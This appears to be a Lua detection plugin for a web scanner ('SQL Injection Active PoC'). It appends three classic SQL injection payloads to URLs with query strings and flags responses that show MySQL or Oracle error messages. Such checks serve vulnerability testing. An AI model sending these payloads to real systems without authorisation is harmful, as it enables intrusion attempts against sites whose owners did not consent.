info = {
    name = "SQL Injection Active PoC",
    author = "dirfuzz",
    severity = "high",
    tags = {"sqli", "active"}
}

function is_target(ctx)
    -- Only test endpoints that have parameters or query strings
    if ctx.discovered_params ~= nil and #ctx.discovered_params > 0 then
        return true
    end
    if string.find(ctx.url, "?") then
        return true
    end
    return false
end

function run(ctx)
    local payloads = {
        "' OR '1'='1",
        "admin' --",
        "1' UNION SELECT NULL--"
    }
    
    for _, payload in ipairs(payloads) do
        local test_url = ctx.url
        if string.find(test_url, "?") then
            test_url = test_url .. "&test=" .. url_encode(payload)
        else
            test_url = test_url .. "?test=" .. url_encode(payload)
        end
        
        local resp = http_send({
            method = "GET",
            url = test_url,
            headers = {
                ["User-Agent"] = "DirFuzz-PoC/1.0"
            }
        })
        
        if not resp.error then
            -- Check for SQL error signatures
            if string.find(resp.body, "SQL syntax") or 
               string.find(resp.body, "mysql_") or
               string.find(resp.body, "ORA%-") then
                
                return {
                    match = true,
                    label = "SQLi",
                    confidence = "High",
                    path = test_url,
                    status_code = resp.status_code,
                    size = string.len(resp.body)
                }
            end
        end
    end
    
    return { match = false }
end
